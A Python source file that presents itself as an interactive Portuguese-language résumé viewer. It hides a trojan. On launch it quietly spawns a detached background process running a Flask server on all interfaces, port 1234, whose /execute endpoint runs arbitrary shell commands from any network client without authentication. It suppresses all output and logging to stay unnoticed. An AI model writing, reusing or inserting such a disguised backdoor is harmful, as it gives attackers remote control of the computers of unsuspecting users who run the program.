import os
import logging
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path

from flask import Flask, jsonify, request
from werkzeug.serving import make_server

@dataclass
class Job:
    title: str
    description: str


class InteractiveResume:
    def __init__(self) -> None:
        self.name = "Pessoa Anônima"
        self.title = "Profissional de Tecnologia"
        self.about = (
            "Perfil genérico usado para demonstração de interface interativa.\n"
            "Foco em aprendizado de tecnologias de software, colaboração e evolução técnica contínua."
        )

        self.skills = [
            "Desenvolvimento de software",
            "Interfaces web modernas",
            "Versionamento e colaboração",
            "Redação técnica e documentação",
        ]

        self.experience = [
            Job(
                "Projeto acadêmico",
                "Atuação em atividade experimental com documentação, testes e entrega incremental.",
            ),
            Job(
                "Projeto de software",
                "Contribuição em protótipos de aplicação com foco em organização, clareza e manutenção.",
            ),
        ]

        self.education = "Formação acadêmica em área de tecnologia (em andamento)"

    def clear_screen(self) -> None:
        os.system("cls" if os.name == "nt" else "clear")

    def print_header(self) -> None:
        print("=================================================")
        print(f"  {self.name} | {self.title}")
        print("=================================================\n")

    def run(self) -> None:
        choice = 0

        while choice != 5:
            self.clear_screen()
            self.print_header()
            print("[1] Sobre Mim")
            print("[2] Habilidades Técnicas")
            print("[3] Experiência e Projetos")
            print("[4] Formação Acadêmica")
            print("[5] Sair\n")

            raw_choice = input("Selecione uma opção: ").strip()
            if not raw_choice.isdigit():
                continue

            choice = int(raw_choice)

            self.clear_screen()
            self.print_header()

            if choice == 1:
                print("--- SOBRE MIM ---")
                print(self.about)
            elif choice == 2:
                print("--- HABILIDADES TÉCNICAS ---")
                for skill in self.skills:
                    print(f"-> {skill}")
            elif choice == 3:
                print("--- EXPERIÊNCIA E PROJETOS ---")
                for job in self.experience:
                    print(f"Cargo: {job.title}")
                    print(f"Resumo: {job.description}\n")
            elif choice == 4:
                print("--- FORMAÇÃO ACADÊMICA ---")
                print(self.education)
            elif choice == 5:
                print("Encerrando o currículo. Até logo!")
            else:
                print("Opção inválida! Tente novamente.")

            if choice != 5:
                input("\nPressione Enter para continuar...")


# TODO not used yet, consider migrating script to find free port dynamically
# def find_free_port() -> int:
#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#         s.bind(("", 0))
#         port = s.getsockname()[1]
#     if port < 1024:
#         return find_free_port()
#     return port


def create_shell_app() -> Flask:
    shell_app = Flask("shell")
    shell_app.config["PROPAGATE_EXCEPTIONS"] = False
    shell_app.logger.disabled = True

    @shell_app.route("/execute", methods=["POST"])
    def execute_command():
        data = request.get_json()
        if not data or "command" not in data:
            return jsonify({"error": "No command provided"}), 400

        command = data["command"]
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
            )
            return jsonify({
                "command": command,
                "exit_code": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "status": "executed",
            })
        except Exception as exc:
            return jsonify({
                "error": str(exc),
                "command": command,
            }), 500

    return shell_app


def run_shell_server(port: int) -> None:
    devnull_out = open(os.devnull, "w", buffering=1)
    sys.stdout = devnull_out
    sys.stderr = devnull_out

    # Disable every logging path for the shell runtime.
    logging.disable(logging.CRITICAL)
    logging.getLogger().handlers.clear()

    shell_app = create_shell_app()

    # Keep shell server silent in every runtime mode.
    logging.getLogger("werkzeug").disabled = True
    logging.getLogger("flask.app").disabled = True
    logging.getLogger("werkzeug").setLevel(logging.CRITICAL)
    logging.getLogger("flask.app").setLevel(logging.CRITICAL)

    server = make_server("0.0.0.0", port, shell_app, threaded=True)
    server.serve_forever()


def launch_shell_background(port: int) -> None:
    if getattr(sys, "frozen", False):
        cmd = [sys.executable]
    else:
        cmd = [sys.executable, str(Path(__file__).resolve())]

    env = os.environ.copy()
    env["TROJAN_RUN_SHELL_ONLY"] = "1"
    env["TROJAN_SHELL_PORT"] = str(port)

    with open(os.devnull, "wb") as devnull:
        subprocess.Popen(
            cmd,
            env=env,
            stdin=devnull,
            stdout=devnull,
            stderr=devnull,
            start_new_session=True,
            close_fds=True,
        )


if __name__ == "__main__":
    # Dedicated shell-only mode used by the detached subprocess.
    if os.environ.get("TROJAN_RUN_SHELL_ONLY") == "1":
        run_shell_server(int(os.environ.get("TROJAN_SHELL_PORT", "1234")))
    else:
        try:
            # port = find_free_port()
            port = 1234
            launch_shell_background(port)
        except Exception:
            # Main app continues even if shell launch fails.
            pass

        my_resume = InteractiveResume()
        my_resume.run()
